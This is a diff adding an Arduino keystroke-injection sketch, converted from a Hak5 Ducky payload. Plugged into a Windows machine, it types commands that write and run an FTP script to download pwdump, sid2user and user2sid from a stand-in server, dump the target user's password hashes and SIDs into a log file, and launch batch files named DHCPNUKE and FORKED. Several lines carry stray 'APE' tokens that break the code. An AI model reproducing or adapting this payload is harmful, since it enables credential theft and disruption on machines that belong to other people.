@@ -1,0 +1,352 @@
+
+/* Converted by Duckuino:
+* https://forums.hak5.org/index.php?/topic/32719-payload-converter-duckuino-duckyscript-to-arduino/?p=244590
+* Enjoy!
+*/
+void setup() {
+	Keyboard.begin();
+//THIS PROGRAM FINDS THE PASSWORD HASH OF A SPECIFIED TARGET
+//REMEMBER TO CHANGE ALL THE DIRECTORIES AND CREDENTIALS TO SUIT YOUR TARGET!
+    
+delay(6000);
+    
+type(KEY_LEFT_ESC,false);APE
+    
+type(KEY_LEFT_CTRL,false);
+type('A',false);
+Keyboard.releaseAll();
+delay(400);
+
+print(F("CMD"));
+delay(300);
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(400);
+
+print(F("NOTEPAD.EXE"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(200);
+    
+
+print(F("PASSLOG > PASSLOG.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+
+print(F("ECHO PROGRAM DEVELOPED BY >> PASSLOG.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+
+print(F("ECHO CYRUS MAJD >> PASSLOG.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+
+print(F("ECHO IN CONTRIBUTION TO >> PASSLOG.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+
+print(F("ECHO ~ =============================================== ~ >> PASSLOG.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+
+print(F("ECHO ` -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- ` >> PASSLOG.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+
+print(F("ECHO ` #     # #     #  #####   #####   #####  ####### ` >> PASSLOG.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+
+print(F("ECHO ` #     # #     # #     # #     # #     #    #    ` >> PASSLOG.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+
+print(F("ECHO ` #     # #     # #       #       #          #    ` >> PASSLOG.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+
+print(F("ECHO ` ####### #######  #####  #        #####     #    ` >> PASSLOG.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+
+print(F("ECHO ` #     # #     #       # #             #    #    ` >> PASSLOG.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+
+print(F("ECHO ` #     # #     # #     # #     # #     #    #    ` >> PASSLOG.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+
+print(F("ECHO ` #     # #     #  #####   #####   #####     #    ` >> PASSLOG.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+
+print(F("ECHO ` -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- ` >> PASSLOG.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+
+print(F("ECHO ~ =============================================== ~ >> PASSLOG.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+    
+type(KEY_LEFT_CTRL,false);
+type('S',false);
+Keyboard.releaseAll();
+    
+//HERE YOU INSTALL ALL YOUR NECESSARY ATTACK CODES
+    
+type(KEY_LEFT_ESC,false);APE
+    
+type(KEY_LEFT_CTRL,false);
+type('A',false);
+Keyboard.releaseAll();
+delay(400);
+
+print(F("CMD"));
+delay(400);
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+
+print(F("ECHO OPEN FTP.EXAMPLE.DOMAIN > INSTALLFTP.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+
+print(F("ECHO USERNAME >> INSTALLFTP.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+
+print(F("ECHO PASSWORD >> INSTALLFTP.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+//PWDUMP.EXE IS A PASSWORD GRABBING TOOL AND IS AVAILABLE AT HTTP://WWW.TARASCO.ORG/SECURITY/PWDUMP_7/PWDUMP7.ZIP
+//THE CODE IS FREE TO DOWNLOAD.
+
+print(F("ECHO GET PWDUMP.EXE >> INSTALLFTP.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(10000);
+//SID2USER.EXE AND USER2SID.EXE ARE PROGRAMS DEVELOPED BY EVGENII BORISOVICH RUDNYI <RUDNYI@MCH1.CHEM.MSU.SU> MOSCOW STATE UNIVERSITY  HTTP://WWW.CHEM.MSU.SU/~RUDNYI/WELCOME.HTML 119899 MOSCOW            +7(095)939 5452, FAX+7(095)932 8846,+7(095)939 1205
+//HIS CODE IS AVAILABLE ONLINE ON HIS WEBSITE.
+
+print(F("ECHO GET SID2USER.EXE >> INSTALLFTP.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(10000);
+
+print(F("ECHO GET USER2SID.EXE >> INSTALLFTP.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(10000);
+
+print(F("ECHO GET FTPTEST.BAT >> INSTALLFTP.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(1000);
+
+print(F("ECHO GET FACTORIAL.BAT >> INSTALLFTP.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(1000);
+
+print(F("ECHO GET DHCPNUKE.BAT >> INSTALLFTP.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(1000);
+
+print(F("ECHO GET FORKED.BAT >> INSTALLFTP.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(1000);
+
+print(F("QUIT >> INSTALLFTP.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(100);
+
+print(F("FTP -S:INSTALLFTP.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(30000);
+
+print(F("EXIT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(100);
+    
+type(KEY_LEFT_ESC,false);APE
+    
+type(KEY_LEFT_CTRL,false);
+type('A',false);
+Keyboard.releaseAll();
+delay(400);
+
+print(F("CMD"));
+delay(400);
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(400);
+
+print(F("CD C:\\USERS\\USER\\DESKTOP\\SID2USER"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(100);
+//REPLACE "USER" IN THE NEXT LINE WITH THE ACTUAL USER YOU ARE TARGETING
+
+print(F("USER2SID USER >> PASSLOG.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(1000);
+
+print(F("SID2USER USER >> PASSLOG.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(1000);
+
+print(F("EXIT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+    
+type(KEY_LEFT_GUI,false);
+Keyboard.releaseAll();
+    
+type(KEY_TAB,false);
+Keyboard.releaseAll();
+delay(200);
+    
+type(KEY_TAB,false);
+Keyboard.releaseAll();
+delay(200);
+    
+type(KEY_DOWN_ARROW,false);
+Keyboard.releaseAll();
+delay(200);
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(100);
+    
+type(KEY_DOWN_ARROW,false);
+Keyboard.releaseAll();
+delay(100);
+    
+type(KEY_DOWN_ARROW,false);
+Keyboard.releaseAll();
+delay(100);
+    
+type(KEY_DOWN_ARROW,false);
+Keyboard.releaseAll();
+delay(100);
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(10000);
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(20000);
+    
+type(KEY_LEFT_ESC,false);APE
+    
+type(KEY_LEFT_CTRL,false);
+type('A',false);
+Keyboard.releaseAll();
+delay(400);
+
+print(F("CMD"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(100);
+
+print(F("CD C:\\USERS\\USER\\DESKTOP\\PWDUMP"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(100);
+
+print(F("PWDUMP.EXE >> C:\\USERS\\USER\\DESKTOP\\PASSLOG.TXT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+
+print(F("EXIT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+//NOW THE PASSWORD HASHES AND SIDS ARE PASSED DOWN TO OUR LOG FILE. ITS TIME TO CALL EVERYONE ELSE INTO ACTION!
+    
+type(KEY_LEFT_ESC,false);APE
+    
+type(KEY_LEFT_CTRL,false);
+type('A',false);
+Keyboard.releaseAll();
+delay(200);
+
+print(F("CMD"));
+delay(200);
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(400);
+
+print(F("CD C:\\USERS\\USER\\DESKTOP"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(200);
+
+print(F("FACTORIAL.BAT"));
+    
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(100);
+    
+type(KEY_LEFT_ESC,false);APE
+    
+Keyboard.end();
+}
+void type(int key, boolean release) {
+	Keyboard.press(key);
+	if(release)
+		Keyboard.release(key);
+}
+void print(const __FlashStringHelper *value) {
+	Keyboard.print(value);
+}
+void loop(){}
